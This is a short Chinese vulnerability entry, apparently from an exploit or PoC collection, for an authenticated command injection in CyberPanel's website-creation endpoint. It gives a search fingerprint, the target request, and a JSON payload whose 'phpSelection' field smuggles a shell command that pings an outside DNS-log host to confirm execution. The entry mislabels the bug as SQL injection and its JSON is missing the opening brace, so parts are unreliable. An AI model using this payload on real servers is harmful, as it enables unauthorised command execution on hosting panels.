# Cyber​​Panel存在身份认证命令注入漏洞

Cyber​​Panel ｜ SQL注入 ｜ —
- **指纹**：`app="CyberPanel"`
- **请求**：`OPTIONS /websites/submitWebsiteCreation HTTP/1.1`

**Payload**
```
"package": "Default",
"domainName": "cyberpanel.net",
"adminEmail": "cyberpanel@gmail.com",
"phpSelection": "PHP 8.0'; ping xyu7rh.dnslog.cn; #",
"ssl": 0,
"websiteOwner": "admin",
"dkimCheck": 0,
"openBasedir": 0,
"mailDomain": 0,
"apacheBackend": 0
}
```
- **响应特征**：200